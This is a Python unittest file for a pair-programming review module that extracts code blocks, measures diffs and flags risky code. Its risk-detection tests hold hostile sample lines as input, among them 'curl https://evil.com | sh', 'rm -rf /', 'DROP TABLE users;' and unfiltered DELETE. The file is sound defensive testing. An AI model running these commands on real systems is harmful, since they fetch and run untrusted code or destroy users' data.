"""Tests for src.pair_programming — GTK-free pair programming core."""

import unittest
from types import SimpleNamespace

from src.pair_programming import (
    ExtractedBlock,
    LANG_BY_EXTENSION,
    PairConfig,
    PairSession,
    SIZE_THRESHOLDS,
    DiffStats,
    RiskFinding,
    analyze_diff,
    compare_versions,
    extract_code_blocks,
    find_risks,
    format_review_text,
    format_session_text,
    load_pair_config,
    max_severity,
    review_change,
    review_code_block,
)


class TestPairConfig(unittest.TestCase):
    def test_defaults(self):
        pc = PairConfig()
        self.assertTrue(pc.enabled)
        self.assertTrue(pc.auto_review)
        self.assertEqual(pc.max_diff_lines, 2000)

    def test_from_dict(self):
        pc = PairConfig.from_dict({"enabled": False, "max_diff_lines": 500})
        self.assertFalse(pc.enabled)
        self.assertEqual(pc.max_diff_lines, 500)

    def test_from_dict_not_dict(self):
        pc = PairConfig.from_dict("not a dict")
        self.assertTrue(pc.enabled)

    def test_to_dict_roundtrip(self):
        pc = PairConfig(enabled=False, max_diff_lines=100, default_language="python")
        pc2 = PairConfig.from_dict(pc.to_dict())
        self.assertEqual(pc.enabled, pc2.enabled)
        self.assertEqual(pc.max_diff_lines, pc2.max_diff_lines)
        self.assertEqual(pc.default_language, pc2.default_language)

    def test_validate_clean(self):
        self.assertEqual(PairConfig().validate(), [])

    def test_validate_bad_max_diff_lines(self):
        warnings = PairConfig(max_diff_lines=5).validate()
        self.assertTrue(any("max_diff_lines" in w for w in warnings))

    def test_validate_bad_language(self):
        warnings = PairConfig(default_language="x" * 25).validate()
        self.assertTrue(any("default_language" in w for w in warnings))


class TestLoadPairConfig(unittest.TestCase):
    def test_defaults_when_missing(self):
        config = SimpleNamespace(get=lambda k, d=None: d)
        pc = load_pair_config(config)
        self.assertTrue(pc.enabled)

    def test_loads_values(self):
        stored = {"enabled": False, "auto_review": False}
        config = SimpleNamespace(get=lambda k, d=None: stored if k == "pair" else d)
        pc = load_pair_config(config)
        self.assertFalse(pc.enabled)
        self.assertFalse(pc.auto_review)

    def test_non_dict_returns_defaults(self):
        config = SimpleNamespace(get=lambda k, d=None: "not a dict" if k == "pair" else d)
        pc = load_pair_config(config)
        self.assertTrue(pc.enabled)


class TestExtractCodeBlocks(unittest.TestCase):
    def test_simple_block(self):
        text = "Here is code:\n```python\nprint('hello')\n```\nDone."
        blocks = extract_code_blocks(text)
        self.assertEqual(len(blocks), 1)
        self.assertEqual(blocks[0].language, "python")
        self.assertIn("print('hello')", blocks[0].content)
        self.assertIsNone(blocks[0].file_path)

    def test_block_with_file_path(self):
        text = "```\n/src/main.py\nprint('hi')\n```"
        blocks = extract_code_blocks(text)
        self.assertEqual(len(blocks), 1)
        self.assertEqual(blocks[0].file_path, "/src/main.py")
        self.assertEqual(blocks[0].language, "python")
        self.assertIn("print('hi')", blocks[0].content)

    def test_block_with_tilde_path(self):
        text = "```\n~/scripts/run.sh\necho hi\n```"
        blocks = extract_code_blocks(text)
        self.assertEqual(len(blocks), 1)
        self.assertEqual(blocks[0].file_path, "~/scripts/run.sh")
        self.assertEqual(blocks[0].language, "bash")

    def test_multiple_blocks(self):
        text = "```python\na = 1\n```\ntext\n```js\nb = 2\n```"
        blocks = extract_code_blocks(text)
        self.assertEqual(len(blocks), 2)
        self.assertEqual(blocks[0].language, "python")
        self.assertEqual(blocks[1].language, "js")

    def test_no_blocks(self):
        self.assertEqual(extract_code_blocks("no code here"), [])

    def test_block_without_language(self):
        text = "```\nsome code\n```"
        blocks = extract_code_blocks(text)
        self.assertEqual(len(blocks), 1)
        self.assertEqual(blocks[0].language, "")
        self.assertIn("some code", blocks[0].content)

    def test_start_line(self):
        text = "line1\nline2\n```python\nx = 1\n```"
        blocks = extract_code_blocks(text)
        self.assertEqual(blocks[0].start_line, 2)

    def test_line_count(self):
        text = "```python\na\nb\nc\n```"
        blocks = extract_code_blocks(text)
        self.assertEqual(blocks[0].line_count, 3)

    def test_suggested_filename_from_path(self):
        block = ExtractedBlock(content="x", file_path="/src/main.py")
        self.assertEqual(block.suggested_filename, "main.py")

    def test_suggested_filename_from_language(self):
        block = ExtractedBlock(content="x", language="python")
        self.assertEqual(block.suggested_filename, "snippet.py")

    def test_suggested_filename_none(self):
        block = ExtractedBlock(content="x")
        self.assertIsNone(block.suggested_filename)

    def test_multiline_block_preserved(self):
        code = "def foo():\n    return 42\n"
        text = "```python\n" + code + "```"
        blocks = extract_code_blocks(text)
        self.assertEqual(blocks[0].content, code.rstrip("\n"))


class TestDiffStats(unittest.TestCase):
    def test_total_changes(self):
        stats = DiffStats(added_lines=5, removed_lines=3)
        self.assertEqual(stats.total_changes, 8)

    def test_size_class_tiny(self):
        stats = DiffStats(added_lines=3, removed_lines=2)
        self.assertEqual(stats.size_class, "tiny")

    def test_size_class_small(self):
        stats = DiffStats(added_lines=10, removed_lines=5)
        self.assertEqual(stats.size_class, "small")

    def test_size_class_medium(self):
        stats = DiffStats(added_lines=50, removed_lines=30)
        self.assertEqual(stats.size_class, "medium")

    def test_size_class_large(self):
        stats = DiffStats(added_lines=300, removed_lines=200)
        self.assertEqual(stats.size_class, "large")

    def test_size_class_huge(self):
        stats = DiffStats(added_lines=1000, removed_lines=500)
        self.assertEqual(stats.size_class, "huge")

    def test_to_dict(self):
        stats = DiffStats(added_lines=2, removed_lines=1, hunks=2)
        d = stats.to_dict()
        self.assertEqual(d["added_lines"], 2)
        self.assertEqual(d["size_class"], "tiny")
        self.assertEqual(d["total_changes"], 3)


class TestAnalyzeDiff(unittest.TestCase):
    def test_no_changes(self):
        stats, diff = analyze_diff("hello\n", "hello\n")
        self.assertEqual(stats.total_changes, 0)
        self.assertEqual(stats.hunks, 0)
        self.assertEqual(diff, "")

    def test_added_lines(self):
        stats, diff = analyze_diff("a\n", "a\nb\nc\n")
        self.assertEqual(stats.added_lines, 2)
        self.assertEqual(stats.removed_lines, 0)
        self.assertIn("+b", diff)
        self.assertIn("+c", diff)

    def test_removed_lines(self):
        stats, diff = analyze_diff("a\nb\nc\n", "a\n")
        self.assertEqual(stats.removed_lines, 2)
        self.assertEqual(stats.added_lines, 0)
        self.assertIn("-b", diff)

    def test_changed_lines(self):
        stats, diff = analyze_diff("a\nb\nc\n", "a\nx\nc\n")
        self.assertEqual(stats.added_lines, 1)
        self.assertEqual(stats.removed_lines, 1)
        self.assertEqual(stats.changed_lines, 1)

    def test_hunks_count(self):
        old = "a\nb\nc\nd\ne\nf\ng\n"
        new = "A\nb\nc\nd\ne\nf\nG\n"
        stats, _ = analyze_diff(old, new, context_lines=0)
        self.assertEqual(stats.hunks, 2)

    def test_total_lines(self):
        stats, _ = analyze_diff("a\nb\n", "a\nb\nc\n")
        self.assertEqual(stats.total_lines_old, 2)
        self.assertEqual(stats.total_lines_new, 3)

    def test_context_lines(self):
        stats, _ = analyze_diff("a\nb\nc\n", "a\nB\nc\n", context_lines=1)
        self.assertGreater(stats.context_lines, 0)


class TestCompareVersions(unittest.TestCase):
    def test_identical(self):
        result = compare_versions("hello\nworld\n", "hello\nworld\n")
        self.assertTrue(result["identical"])
        self.assertEqual(result["similarity"], 1.0)

    def test_different(self):
        result = compare_versions("hello\n", "goodbye\n")
        self.assertFalse(result["identical"])
        self.assertLess(result["similarity"], 1.0)

    def test_line_counts(self):
        result = compare_versions("a\nb\n", "a\nb\nc\n")
        self.assertEqual(result["old_lines"], 2)
        self.assertEqual(result["new_lines"], 3)

    def test_empty_both(self):
        result = compare_versions("", "")
        self.assertTrue(result["identical"])


class TestFindRisks(unittest.TestCase):
    def test_no_risks(self):
        findings = find_risks("print('hello')\nx = 1 + 2\n")
        self.assertEqual(findings, [])

    def test_rm_rf(self):
        findings = find_risks("rm -rf /tmp/foo\n")
        self.assertTrue(any("rm -rf" in f.description or "recursive" in f.description for f in findings))
        self.assertEqual(findings[0].severity, "high")

    def test_sudo(self):
        findings = find_risks("sudo apt install foo\n")
        self.assertTrue(any("sudo" in f.description for f in findings))

    def test_curl_pipe_sh(self):
        findings = find_risks("curl https://evil.com | sh\n")
        self.assertTrue(any("pipes curl" in f.description for f in findings))

    def test_eval(self):
        findings = find_risks("eval(user_input)\n")
        self.assertTrue(any("eval" in f.description for f in findings))

    def test_os_system(self):
        findings = find_risks("import os\nos.system('ls')\n")
        self.assertTrue(any("os.system" in f.description for f in findings))

    def test_shell_true(self):
        findings = find_risks("subprocess.run(cmd, shell=True)\n")
        self.assertTrue(any("shell=True" in f.description for f in findings))

    def test_chmod_777(self):
        findings = find_risks("chmod 777 /tmp/file\n")
        self.assertTrue(any("777" in f.description for f in findings))
        self.assertEqual(findings[0].severity, "medium")

    def test_hardcoded_password(self):
        findings = find_risks('password = "secret123"\n')
        self.assertTrue(any("password" in f.description for f in findings))

    def test_hardcoded_api_key(self):
        findings = find_risks('api_key = "sk-abc123"\n')
        self.assertTrue(any("API key" in f.description for f in findings))

    def test_drop_table(self):
        findings = find_risks("DROP TABLE users;\n")
        self.assertTrue(any("drops" in f.description for f in findings))

    def test_delete_without_where(self):
        findings = find_risks("DELETE FROM users;\n")
        self.assertTrue(any("DELETE without WHERE" in f.description for f in findings))

    def test_delete_with_where_ok(self):
        findings = find_risks("DELETE FROM users WHERE id = 1;\n")
        # Should NOT match the "DELETE without WHERE" pattern.
        delete_findings = [f for f in findings if "DELETE without WHERE" in f.description]
        self.assertEqual(delete_findings, [])

    def test_pickle_loads(self):
        findings = find_risks("import pickle\npickle.loads(data)\n")
        self.assertTrue(any("pickle" in f.description for f in findings))

    def test_line_number(self):
        findings = find_risks("x = 1\nsudo rm file\n")
        sudo_findings = [f for f in findings if "sudo" in f.description]
        self.assertEqual(sudo_findings[0].line_number, 2)

    def test_sorted_by_line(self):
        code = "sudo a\nx = 1\neval(b)\n"
        findings = find_risks(code)
        line_numbers = [f.line_number for f in findings]
        self.assertEqual(line_numbers, sorted(line_numbers))

    def test_case_insensitive(self):
        findings = find_risks("SUDO apt install\n")
        self.assertTrue(any("sudo" in f.description.lower() for f in findings))


class TestMaxSeverity(unittest.TestCase):
    def test_empty(self):
        self.assertEqual(max_severity([]), "none")

    def test_high(self):
        findings = [RiskFinding("low", "p", "d"), RiskFinding("high", "p", "d")]
        self.assertEqual(max_severity(findings), "high")

    def test_medium(self):
        findings = [RiskFinding("low", "p", "d"), RiskFinding("medium", "p", "d")]
        self.assertEqual(max_severity(findings), "medium")

    def test_low(self):
        findings = [RiskFinding("low", "p", "d")]
        self.assertEqual(max_severity(findings), "low")


class TestReviewChange(unittest.TestCase):
    def test_no_changes(self):
        result = review_change("hello\n", "hello\n")
        self.assertEqual(result.stats.total_changes, 0)
        self.assertTrue(any("No changes" in r for r in result.recommendations))

    def test_small_clean_change(self):
        result = review_change("a\n", "a\nb\n")
        self.assertEqual(result.stats.size_class, "tiny")
        self.assertEqual(result.risk_level, "none")
        self.assertTrue(result.passed)
        self.assertTrue(any("no detected risks" in r.lower() for r in result.recommendations))

    def test_large_change_recommendation(self):
        old = "\n".join("line{}".format(i) for i in range(600))
        new = "\n".join("LINE{}".format(i) for i in range(600))
        result = review_change(old, new)
        self.assertTrue(any("Large change" in r for r in result.recommendations))

    def test_high_risk_detected(self):
        old = "x = 1\n"
        new = "x = 1\nrm -rf /tmp/foo\n"
        result = review_change(old, new)
        self.assertEqual(result.risk_level, "high")
        self.assertFalse(result.passed)
        self.assertTrue(any("high-severity" in r for r in result.recommendations))

    def test_medium_risk_detected(self):
        old = "x = 1\n"
        new = 'x = 1\npassword = "secret"\n'
        result = review_change(old, new)
        self.assertEqual(result.risk_level, "medium")
        self.assertTrue(result.passed)  # medium is not blocking

    def test_risks_disabled(self):
        config = PairConfig(highlight_risks=False)
        result = review_change("x = 1\n", "x = 1\nrm -rf /\n", config=config)
        self.assertEqual(result.risks, [])

    def test_summary(self):
        result = review_change("a\n", "a\nb\n")
        self.assertIn("Tiny", result.summary)
        self.assertIn("no risks", result.summary)

    def test_to_dict(self):
        result = review_change("a\n", "a\nb\nrm -rf /tmp/x\n")
        d = result.to_dict()
        self.assertIn("stats", d)
        self.assertIn("risks", d)
        self.assertIn("risk_level", d)
        self.assertEqual(d["risk_level"], "high")


class TestReviewCodeBlock(unittest.TestCase):
    def test_clean_block(self):
        block = ExtractedBlock(content="print('hello')\n", language="python")
        result = review_code_block(block)
        self.assertEqual(result.risk_level, "none")
        self.assertTrue(any("No risks" in r for r in result.recommendations))

    def test_risky_block(self):
        block = ExtractedBlock(content="rm -rf /tmp/foo\n", language="bash")
        result = review_code_block(block)
        self.assertEqual(result.risk_level, "high")
        self.assertFalse(result.passed)

    def test_large_block(self):
        block = ExtractedBlock(content="\n".join("x = {}".format(i) for i in range(250)))
        result = review_code_block(block)
        self.assertTrue(any("Large code block" in r for r in result.recommendations))


class TestPairSession(unittest.TestCase):
    def test_empty_session(self):
        session = PairSession()
        self.assertEqual(session.total_blocks, 0)
        self.assertEqual(session.total_risks, 0)
        s = session.summary()
        self.assertEqual(s["exchanges"], 0)

    def test_add_exchange(self):
        session = PairSession()
        exchange = session.add_exchange(
            "How do I print hello?",
            "Use this:\n```python\nprint('hello')\n```",
            timestamp=123.0,
        )
        self.assertEqual(len(session.exchanges), 1)
        self.assertEqual(len(exchange.blocks), 1)
        self.assertEqual(exchange.blocks[0].language, "python")
        self.assertEqual(len(exchange.reviews), 1)
        self.assertEqual(session.total_blocks, 1)

    def test_multiple_exchanges(self):
        session = PairSession()
        session.add_exchange("q1", "```python\nx = 1\n```")
        session.add_exchange("q2", "```js\ny = 2\n```\n```bash\nrm -rf /tmp\n```")
        self.assertEqual(session.total_blocks, 3)
        self.assertGreater(session.total_risks, 0)
        self.assertGreater(session.high_risk_count, 0)

    def test_summary_languages(self):
        session = PairSession()
        session.add_exchange("q", "```python\nx\n```\n```js\ny\n```")
        s = session.summary()
        self.assertIn("python", s["languages"])
        self.assertIn("js", s["languages"])

    def test_to_dict(self):
        session = PairSession()
        session.add_exchange("q", "```python\nprint(1)\n```", timestamp=1.0)
        d = session.to_dict()
        self.assertIn("exchanges", d)
        self.assertIn("summary", d)
        self.assertEqual(len(d["exchanges"]), 1)


class TestFormatReviewText(unittest.TestCase):
    def test_basic(self):
        result = review_change("a\n", "a\nb\n")
        text = format_review_text(result)
        self.assertIn("Review:", text)
        self.assertIn("Changes:", text)
        self.assertIn("Recommendations:", text)

    def test_with_risks(self):
        result = review_change("x\n", "x\nrm -rf /tmp\n")
        text = format_review_text(result)
        self.assertIn("Risks", text)
        self.assertIn("HIGH", text)

    def test_with_diff(self):
        result = review_change("a\n", "a\nb\n")
        _, diff = analyze_diff("a\n", "a\nb\n")
        text = format_review_text(result, diff)
        self.assertIn("Diff:", text)
        self.assertIn("+b", text)


class TestFormatSessionText(unittest.TestCase):
    def test_empty(self):
        text = format_session_text(PairSession())
        self.assertIn("Pair Programming Session", text)
        self.assertIn("Exchanges: 0", text)

    def test_with_exchanges(self):
        session = PairSession()
        session.add_exchange("q1", "```python\nx = 1\n```")
        text = format_session_text(session)
        self.assertIn("Exchange 1", text)
        self.assertIn("q1", text)


class TestLangByExtension(unittest.TestCase):
    def test_python(self):
        self.assertEqual(LANG_BY_EXTENSION[".py"], "python")

    def test_bash(self):
        self.assertEqual(LANG_BY_EXTENSION[".sh"], "bash")

    def test_yaml(self):
        self.assertEqual(LANG_BY_EXTENSION[".yml"], "yaml")


class TestSizeThresholds(unittest.TestCase):
    def test_thresholds_ordered(self):
        self.assertLess(SIZE_THRESHOLDS["tiny"], SIZE_THRESHOLDS["small"])
        self.assertLess(SIZE_THRESHOLDS["small"], SIZE_THRESHOLDS["medium"])
        self.assertLess(SIZE_THRESHOLDS["medium"], SIZE_THRESHOLDS["large"])


if __name__ == "__main__":
    unittest.main()
